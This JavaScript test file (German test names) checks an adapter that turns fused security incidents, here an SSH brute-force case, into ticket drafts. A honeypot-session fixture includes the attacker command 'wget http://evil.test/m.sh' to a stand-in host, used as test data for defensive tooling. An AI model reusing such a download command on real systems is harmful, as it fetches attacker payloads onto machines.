'use strict';

const { DataplaneIncidentAdapter } = require('../src/integrations/adapters/dataplane/DataplaneIncidentAdapter');
const { ValidationError } = require('../src/errors/AppError');

const incident = () => ({
  incidentId: 'a'.repeat(64),
  fusionKey: '45.143.200.12|198.51.100.10@9876',
  domains: ['ids', 'firewall', 'siem'],
  severity: 'high',
  verdict: 'confirmed_malicious',
  network: { srcIp: '45.143.200.12', dstIp: '198.51.100.10', dstPort: 22, protocol: 'tcp', bytesToServer: 1840, bytesToClient: 1450, pktsToServer: 12, pktsToClient: 9 },
  entities: [{ type: 'ip', value: '45.143.200.12', role: 'source' }, { type: 'ip', value: '198.51.100.10', role: 'destination' }],
  signatures: ['ET SCAN SSH', 'sshd brute force'],
  mitre: ['T1110', 'T1078'],
  firewallActions: ['block'],
  confidence: 1,
  eventCount: 4,
  eventIds: ['e1', 'e2', 'e3', 'e4'],
  windowStart: '2026-06-25T12:00:00.000Z',
  windowEnd: '2026-06-25T12:01:00.000Z',
});

describe('DataplaneIncidentAdapter', () => {
  const adapter = new DataplaneIncidentAdapter();

  test('validate akzeptiert einen wohlgeformten FusedIncident', () => {
    expect(() => adapter.validate(incident())).not.toThrow();
  });

  test('validate wirft bei fehlender incidentId / falschem verdict', () => {
    const bad = incident(); delete bad.incidentId;
    expect(() => adapter.validate(bad)).toThrow(ValidationError);
    const bad2 = incident(); bad2.verdict = 'definitely-bad';
    expect(() => adapter.validate(bad2)).toThrow(ValidationError);
  });

  test('validate wirft bei Nicht-Objekt', () => {
    expect(() => adapter.validate(null)).toThrow(ValidationError);
    expect(() => adapter.validate('x')).toThrow(ValidationError);
  });

  test('normalize → 5-Tuple, externalId = incidentId, Severity bleibt Priority', () => {
    const n = adapter.normalize(incident());
    expect(n.externalId).toBe('a'.repeat(64));
    expect(n.srcIp).toBe('45.143.200.12');
    expect(n.dstIp).toBe('198.51.100.10');
    expect(n.priority).toBe('high');
    expect(n.source).toBe('dataplane');
  });

  test('normalize-Description enthält Verdikt, Domänen, Signaturen, MITRE, Bytes', () => {
    const n = adapter.normalize(incident());
    expect(n.description).toMatch(/confirmed_malicious/);
    expect(n.description).toMatch(/ids.*firewall.*siem|ids, firewall, siem/);
    expect(n.description).toMatch(/ET SCAN SSH/);
    expect(n.description).toMatch(/T1110/);
    expect(n.description).toMatch(/1840/);
  });

  test('toTicketDraft → OPEN/assigned, source dataplane, offenseId = incidentId, IOCs gesetzt', () => {
    const draft = adapter.toTicketDraft(adapter.normalize(incident()));
    expect(draft.state).toBe('OPEN');
    expect(draft.status).toBe('assigned');
    expect(draft.source).toBe('dataplane');
    expect(draft.offenseId).toBe('a'.repeat(64));
    expect(draft.priority).toBe('high');
    expect(draft.iocs).toMatch(/45\.143\.200\.12/);
  });

  test('normalize → strukturierte Netzwerk-Felder fürs Deck (port/protocol/bytes/attackerIp)', () => {
    const n = adapter.normalize(incident());
    expect(n.port).toBe('22');
    expect(n.protocol).toBe('tcp');
    expect(n.bytesSent).toBe('1840');
    expect(n.bytesRecv).toBe('1450');
    expect(n.attackerIp).toBe('45.143.200.12');
    expect(n.mitre).toMatch(/T1110/);
    expect(n.mitre).toMatch(/T1078/);
  });

  test('normalize → Pakete/Action/Fenster/Events fürs App-Map-Traffic (Flow-Statistik)', () => {
    const n = adapter.normalize(incident());
    expect(n.pktsSent).toBe('12');          // pktsToServer
    expect(n.pktsRecv).toBe('9');           // pktsToClient
    expect(n.firewallAction).toBe('block'); // firewallActions[0] → denied-Bucket
    expect(n.firstSeen).toBe('2026-06-25T12:00:00.000Z'); // windowStart
    expect(n.lastSeen).toBe('2026-06-25T12:01:00.000Z');  // windowEnd
    expect(n.eventCount).toBe('4');         // eventCount (speist FE totalEvents)
  });

  test('normalize → fehlende Pakete/Action/Fenster → leer, kein Crash', () => {
    const inc = incident();
    inc.network = { srcIp: '45.143.200.12' }; // keine pkts
    inc.firewallActions = [];
    delete inc.windowStart; delete inc.windowEnd;
    const n = adapter.normalize(inc);
    expect(n.pktsSent).toBe('');
    expect(n.pktsRecv).toBe('');
    expect(n.firewallAction).toBe('');
    expect(n.firstSeen).toBe('');
    expect(n.lastSeen).toBe('');
    // eventCount ist im Contract Pflicht (min 1) — bleibt gesetzt.
    expect(n.eventCount).toBe('4');
  });

  test('toTicketDraft reicht Pakete/Action/Fenster/Events durch (App-Map)', () => {
    const d = adapter.toTicketDraft(adapter.normalize(incident()));
    expect(d.pktsSent).toBe('12');
    expect(d.pktsRecv).toBe('9');
    expect(d.firewallAction).toBe('block');
    expect(d.firstSeen).toBe('2026-06-25T12:00:00.000Z');
    expect(d.lastSeen).toBe('2026-06-25T12:01:00.000Z');
    expect(d.eventCount).toBe('4');
  });

  test('normalize → Verdikt als decision + confidence (0-100)', () => {
    expect(adapter.normalize(incident()).decision).toBe('incident');   // confirmed_malicious
    expect(adapter.normalize(incident()).confidence).toBe(100);        // confidence 1 → 100
    const susp = incident(); susp.verdict = 'suspicious';
    expect(adapter.normalize(susp).decision).toBe('suspicious');
    const obs = incident(); obs.verdict = 'observed';
    expect(adapter.normalize(obs).decision).toBe('');                  // reine Telemetrie → keine Entscheidung
  });

  test('toTicketDraft reicht strukturierte Felder durch (Deck-Tabs)', () => {
    const d = adapter.toTicketDraft(adapter.normalize(incident()));
    expect(d.port).toBe('22');
    expect(d.protocol).toBe('tcp');
    expect(d.bytesSent).toBe('1840');
    expect(d.bytesRecv).toBe('1450');
    expect(d.mitre).toMatch(/T1110/);
    expect(d.decision).toBe('incident');
    expect(d.confidence).toBe(100);
  });

  test('normalize/Draft setzt KEIN alertCount — das ist der Wiederholungs-Zähler der Route', () => {
    const inc = incident(); inc.eventCount = 1231;
    const n = adapter.normalize(inc);
    expect(n.alertCount).toBeUndefined();
    expect(adapter.toTicketDraft(n)).not.toHaveProperty('alertCount');
    // Die Anzahl gefuster Events steht in der Description, nicht im Wiederholungs-Zähler.
    expect(n.description).toContain('Events: 1231');
  });

  test('normalize: fehlende Netzwerk-/Bytes-Felder → leer, kein Crash', () => {
    const inc = incident(); inc.network = null; inc.mitre = []; inc.confidence = null;
    const n = adapter.normalize(inc);
    expect(n.port).toBe('');
    expect(n.protocol).toBe('');
    expect(n.bytesSent).toBe('');
    expect(n.mitre).toBe('');
    expect(n.confidence).toBeNull();
  });

  test('Severity→Priority-Mapping deckt alle Stufen ab', () => {
    for (const sev of ['info', 'low', 'medium', 'high', 'critical']) {
      const inc = incident(); inc.severity = sev;
      expect(adapter.normalize(inc).priority).toBe(sev);
    }
  });

  // ── sessionActivity → Ticket-payloads (Honeypot-Session-Sichtbarkeit) ──
  const sessionActivity = [
    { kind: 'login', user: 'root', at: '2026-06-25T12:00:00.000Z' },
    { kind: 'command', value: 'wget http://evil.test/m.sh', at: '2026-06-25T12:00:05.000Z' },
    { kind: 'download', value: 'http://evil.test/m.sh', at: '2026-06-25T12:00:07.000Z' },
    { kind: 'tunnel', value: '203.0.113.9:25', at: '2026-06-25T12:00:09.000Z' },
  ];

  test('validate akzeptiert sessionActivity (additiv)', () => {
    const inc = incident(); inc.sessionActivity = sessionActivity;
    expect(() => adapter.validate(inc)).not.toThrow();
  });

  test('normalize → sessionActivity wird zu payloads (kind→PAYLOAD_TYPE, value→raw)', () => {
    const inc = incident(); inc.sessionActivity = sessionActivity;
    const n = adapter.normalize(inc);
    expect(Array.isArray(n.payloads)).toBe(true);
    expect(n.payloads).toHaveLength(4);
    const cmd = n.payloads.find((p) => p.raw === 'wget http://evil.test/m.sh');
    expect(cmd.type).toBe('Command');
    const dl = n.payloads.find((p) => p.raw === 'http://evil.test/m.sh');
    expect(dl.type).toBe('URL');
  });

  test('normalize → login-payload trägt user, KEIN Passwort', () => {
    const inc = incident(); inc.sessionActivity = sessionActivity;
    const n = adapter.normalize(inc);
    const login = n.payloads.find((p) => p.fields && p.fields.user === 'root');
    expect(login).toBeTruthy();
    expect(JSON.stringify(n.payloads)).not.toMatch(/password/i);
  });

  test('normalize → payload-fields tragen kind + at (Kontext für die View)', () => {
    const inc = incident(); inc.sessionActivity = sessionActivity;
    const n = adapter.normalize(inc);
    const cmd = n.payloads.find((p) => p.raw === 'wget http://evil.test/m.sh');
    expect(cmd.fields.kind).toBe('command');
    expect(cmd.fields.at).toBe('2026-06-25T12:00:05.000Z');
  });

  test('toTicketDraft reicht payloads durch', () => {
    const inc = incident(); inc.sessionActivity = sessionActivity;
    const d = adapter.toTicketDraft(adapter.normalize(inc));
    expect(Array.isArray(d.payloads)).toBe(true);
    expect(d.payloads.length).toBe(4);
  });

  test('ohne sessionActivity → payloads leeres Array (kein Crash)', () => {
    const n = adapter.normalize(incident());
    expect(n.payloads).toEqual([]);
    const d = adapter.toTicketDraft(n);
    expect(d.payloads).toEqual([]);
  });
});
